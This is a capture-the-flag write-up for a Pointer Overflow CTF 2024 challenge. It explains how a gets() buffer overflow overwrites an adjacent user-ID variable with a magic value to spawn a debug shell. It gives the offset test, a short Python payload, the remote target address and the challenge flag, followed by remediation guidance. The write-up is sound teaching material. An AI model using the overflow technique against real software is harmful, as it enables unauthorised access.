# Overrun and Outdone

**Category:** Exploitation
**Challenge:** Overrun and Outdone
**CTF:** Pointer Overflow CTF 2024
**Points:** Exploit 200
**Result:** Solved

**Flag:**

~~~text
poctf{uwsp_17_w45_7h3_b357_0f_71m35}
~~~

---

## 1. Challenge Overview

This challenge exploits a buffer overflow to modify a variable that controls access to a debug mode. Instead of redirecting execution to another function, the goal is to overwrite a specific struct member (`u.id`) with a magic value (`80085`) to trigger a hidden shell.

**Target:** `35.184.182.18:32001`
**Files:** `Exploit200-1_source.c` (source code)

---

## 2. Source Code Analysis

Key findings from the source:

- A `gets()` call reads into a buffer adjacent to a `u.id` variable
- When `u.id` equals `80085`, the program enters debug mode and spawns a shell
- Default `u.id` value corresponds to a "Guest" role

The struct layout in memory places the buffer directly before `u.id`, making overflow trivial.

---

## 3. Determining the Overflow Offset

Tested incremental input lengths to identify the boundary:

~~~bash
python -c "print('A'*28)" | ./Exploit200-1
~~~

At 28 bytes, the buffer is full. The next bytes directly overwrite `u.id`.

---

## 4. Payload Construction

The target value is `80085` (decimal), which is `0x000138BD` in hexadecimal. Using `struct.pack` for proper little-endian representation:

~~~python
import struct

buffer = b"A" * 28
value = struct.pack("<I", 80085)
payload = buffer + value
~~~

The full exploit is in [payload.py](scripts/payload.py).

---

## 5. Exploitation and Flag

Injected the payload against the remote target. Debug mode activated, shell spawned:

~~~bash
ls
cat Exploit200-1_flag.txt
~~~

Flag: `poctf{uwsp_17_w45_7h3_b357_0f_71m35}`

---

## Lessons Learned

| # | Lesson | Detail |
|---|--------|--------|
| 1 | Overflow targets beyond return addresses | Variable overwrites are a distinct exploitation vector |
| 2 | Struct memory layout matters | Adjacent members in structs can be reached via overflow |
| 3 | `struct.pack` ensures correct byte order | Little-endian encoding is critical for x86 payloads |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID | Context |
|---|---|---|---|
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Overwrote user ID to gain admin/debug access |
| Execution | Exploitation for Client Execution | T1203 | Buffer overflow triggers hidden shell functionality |
| Defense Evasion | Abuse Elevation Control Mechanism | T1548 | Bypassed role check via memory corruption |

> **CWE-120:** Buffer Copy without Checking Size of Input. Unbounded `gets()` allows overwriting adjacent memory.
> **CWE-269:** Improper Privilege Management. A single magic integer value gates access to a shell.

---

## Remediation and Containment

### Technical Fixes

1. Use `fgets()` with explicit size limits for all user input
2. Separate control variables from user-input buffers (different memory pages or stack frames)
3. Validate privilege state server-side, not through a local variable comparison
4. Compile with stack canaries and FORTIFY_SOURCE

### MITRE D3FEND Countermeasures

- **D3-SEA (Stack Frame Canary Validation):** detect corruption of local variables adjacent to buffers
- **D3-ACL (Access Control List):** enforce authorization through kernel mechanisms, not userspace variables
- **D3-PSEP (Process Segment Execution Prevention):** defense in depth against arbitrary code execution

### NIST CSF 2.0

- **Protect (PR.AC):** implement proper access control mechanisms, not magic-value comparisons
- **Detect (DE.CM):** monitor for anomalous privilege transitions in running processes
- **Respond (RS.MI):** kill processes exhibiting unauthorized privilege changes

### NIST SP 800-53 Rev. 5

- **AC-6 (Least Privilege):** enforce role separation through OS-level mechanisms
- **SI-16 (Memory Protection):** protect control flow and sensitive variables from corruption
- **SA-11 (Developer Testing and Evaluation):** test for adjacent variable overflow conditions

### C2M2

- **ACCESS-3:** verify all privilege escalation paths use validated, server-side authorization
- **THREAT-3:** include variable overwrite scenarios in exploitation testing

---

Thanks guys!! (❍ᴥ❍ʋ)

---

It was the best of times for buffer overflows. This challenge shows that you do not need to hijack control flow to win: sometimes just changing the right number in memory is enough to pop a shell.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

> **Reference:** Adapted from [shivang1209-dot/CTF-Writeups](https://github.com/shivang1209-dot/CTF-Writeups). Original scripts credited to the author.
